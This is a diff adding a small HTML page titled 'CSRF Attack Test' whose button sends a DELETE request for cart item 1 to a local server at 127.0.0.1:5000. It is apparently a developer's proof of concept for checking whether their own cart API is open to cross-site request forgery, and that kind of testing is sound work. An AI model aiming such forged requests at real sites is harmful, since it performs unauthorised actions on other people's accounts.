@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Attack Test</title>
+    <script>
+        function deleteItem() {
+            const itemId = 1;
+            fetch(`http://127.0.0.1:5000/cart/${itemId}`, {
+                method: 'DELETE',
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert(`ID ${itemId} has delete`);
+                } else {
+                    alert('delete failed');
+                }
+            })
+            .catch(error => {
+                console.error('failed:', error);
+                alert('failed');
+            });
+        }
+    </script>
+</head>
+<body>
+    <h1>CSRF Attack Test</h1>
+    <button onclick="deleteItem()">Delete Item with ID 1</button>
+</body>
+</html>
